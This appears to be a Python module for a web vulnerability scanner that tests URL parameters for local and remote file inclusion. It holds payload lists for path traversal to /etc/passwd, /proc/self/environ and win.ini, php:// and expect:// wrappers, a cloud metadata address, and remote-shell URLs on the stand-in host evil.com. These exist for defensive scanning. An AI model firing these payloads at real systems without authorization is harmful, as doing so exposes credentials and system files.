"""
Local File Inclusion (LFI) / Remote File Inclusion (RFI) Scanner
"""
import re
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity


class LFIRFIScanner(BaseScanner):
    """LFI/RFI vulnerability scanner"""
    
    # Local file inclusion payloads
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.txt",
        "../../../etc/passwd\0",
        "../../../windows/win.ini",
        "..\\..\\..\\windows\\win.ini",
        "../../../proc/self/environ",
        "../../../proc/version",
        "php://filter/read=string.rot13/resource=../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
        "file:///etc/passwd",
        "expect://id",
    ]
    
    # Remote file inclusion payloads
    RFI_PAYLOADS = [
        "http://evil.com/shell.php",
        "https://evil.com/shell.php",
        "ftp://evil.com/shell.php",
        "\\\\evil.com\\shell.php",
        "http://127.0.0.1:8080/shell.php",
        "http://169.254.169.254/latest/meta-data/",
    ]
    
    # Null byte variations
    NULL_BYTE_PAYLOADS = [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.txt",
        "../../../etc/passwd\0",
        "../../../etc/passwd\x00",
        "..%2F..%2F..%2Fetc%2Fpasswd%00",
    ]
    
    # Success indicators
    SUCCESS_PATTERNS = {
        "passwd": [
            r"root:x:\d+:\d+:",
            r"daemon:x:\d+:\d+:",
        ],
        "win.ini": [
            r"\[fonts\]",
            r"\[extensions\]",
            r"for 16-bit app support",
        ],
        "environ": [
            r"PATH=",
            r"HOME=",
            r"USER=",
        ],
    }
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Scan for LFI/RFI vulnerabilities"""
        vulnerabilities = []
        
        test_params = params or {}
        if not test_params:
            if "?" in url:
                query_string = url.split("?")[1]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        # Test LFI
        for param_name, param_value in test_params.items():
            lfi_vuln = await self._test_lfi(url, param_name, param_value, method)
            if lfi_vuln:
                vulnerabilities.append(lfi_vuln)
            
            # Test RFI (be careful with external requests)
            rfi_vuln = await self._test_rfi(url, param_name, param_value, method)
            if rfi_vuln:
                vulnerabilities.append(rfi_vuln)
        
        return vulnerabilities
    
    async def _test_lfi(
        self, url: str, param: str, value: str, method: str
    ) -> Optional[Vulnerability]:
        """Test for Local File Inclusion"""
        all_payloads = self.LFI_PAYLOADS + self.NULL_BYTE_PAYLOADS
        
        for payload in all_payloads[:10]:  # Limit for performance
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params)
                else:
                    resp = await self.http_client.post(url, data=test_params)
                
                # Check for file content
                file_type = self._detect_file_type(payload)
                if file_type and self._check_file_content(resp.text, file_type):
                    return self._create_vulnerability(
                        name="Local File Inclusion (LFI)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload,
                        description=f"LFI vulnerability detected. File type: {file_type}",
                        evidence="Local file content found in response",
                        recommendation="Validate and sanitize file paths. Use whitelist of allowed files. Avoid user input in file inclusion operations.",
                        cwe="CWE-98"
                    )
            except:
                continue
        
        return None
    
    async def _test_rfi(
        self, url: str, param: str, value: str, method: str
    ) -> Optional[Vulnerability]:
        """Test for Remote File Inclusion"""
        # Use a test URL that we can check
        test_urls = [
            "http://httpbin.org/base64/aGVsbG8=",  # Base64 encoded "hello"
            "http://httpbin.org/status/200",
        ]
        
        for test_url in test_urls[:1]:  # Limit external requests
            try:
                test_params = {param: test_url}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=10)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=10)
                
                # Check if external content was included
                if self._check_rfi_success(resp.text, test_url):
                    return self._create_vulnerability(
                        name="Remote File Inclusion (RFI)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=test_url,
                        description="RFI vulnerability detected",
                        evidence="External content appears to be included",
                        recommendation="Disable remote file inclusion. Validate and sanitize file paths. Use whitelist of allowed files.",
                        cwe="CWE-98"
                    )
            except:
                continue
        
        return None
    
    def _detect_file_type(self, payload: str) -> Optional[str]:
        """Detect file type from payload"""
        payload_lower = payload.lower()
        
        if "passwd" in payload_lower:
            return "passwd"
        elif "win.ini" in payload_lower:
            return "win.ini"
        elif "environ" in payload_lower:
            return "environ"
        elif "version" in payload_lower:
            return "version"
        
        return None
    
    def _check_file_content(self, text: str, file_type: str) -> bool:
        """Check if response contains expected file content"""
        if file_type in self.SUCCESS_PATTERNS:
            for pattern in self.SUCCESS_PATTERNS[file_type]:
                if re.search(pattern, text, re.IGNORECASE):
                    return True
        
        # Generic checks
        if file_type == "passwd" and re.search(r"^\w+:\w*:\d+:\d+:", text, re.MULTILINE):
            return True
        
        return False
    
    def _check_rfi_success(self, text: str, test_url: str) -> bool:
        """Check if RFI was successful"""
        # Check for content from test URL
        if "httpbin.org" in test_url:
            # Look for httpbin response indicators
            if "httpbin" in text.lower() or "base64" in text.lower():
                return True
        
        return False

